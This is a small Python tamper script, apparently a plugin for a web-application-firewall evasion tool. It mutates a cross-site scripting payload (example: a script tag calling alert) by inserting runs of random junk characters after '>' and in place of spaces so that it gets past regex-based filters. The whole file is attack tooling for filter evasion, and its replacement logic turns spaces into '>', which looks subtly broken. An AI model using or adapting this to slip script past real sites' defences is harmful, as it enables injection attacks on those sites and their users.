import random


__example_payload__ = "<script>alert('1');</script>"
__type__ = "adding random junk characters into the payload to bypass regex based protection"


def tamper(payload, **kwargs):
    junk_chars = "!#$%&()*~+-_.,:;?@[/|\]^`"
    retval = ""
    # we'll just return a payload if it's not worth tampering with this
    if "<" not in payload or " " not in payload:
        return payload
    for i, char in enumerate(payload, start=1):
        if char == ">" or char == " " and i < len(payload):
            amount = random.randint(10, 15)
            retval += ">"
            for _ in range(amount):
                retval += random.choice(junk_chars)
        else:
            retval += char
    return retval
